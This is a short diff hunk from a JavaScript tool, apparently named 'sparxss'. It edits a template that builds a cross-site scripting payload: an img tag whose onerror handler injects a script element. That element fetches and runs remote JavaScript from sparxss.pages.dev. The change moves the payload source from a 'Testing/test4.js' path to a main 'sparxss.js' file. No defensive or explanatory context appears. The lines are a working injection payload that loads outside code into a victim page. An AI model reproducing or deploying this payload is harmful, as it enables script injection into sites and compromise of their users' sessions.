@@ -815,7 +815,7 @@ linkText.style.textAlign = 'center';
 
 link.appendChild(linkText);`;
 
-                var codeBeginning = `<img src="#" onerror="var scriptElement = document.createElement('script'); scriptElement.src = 'https://sparxss.pages.dev/Testing/test4.js'; scriptElement.onload = function () {if (typeof saved === 'undefined') {saved = true;`;
+                var codeBeginning = `<img src="#" onerror="var scriptElement = document.createElement('script'); scriptElement.src = 'https://sparxss.pages.dev/sparxss.js'; scriptElement.onload = function () {if (typeof saved === 'undefined') {saved = true;`;
                 
                 var codeEnd = `} }; document.body.appendChild(scriptElement);">`;
         
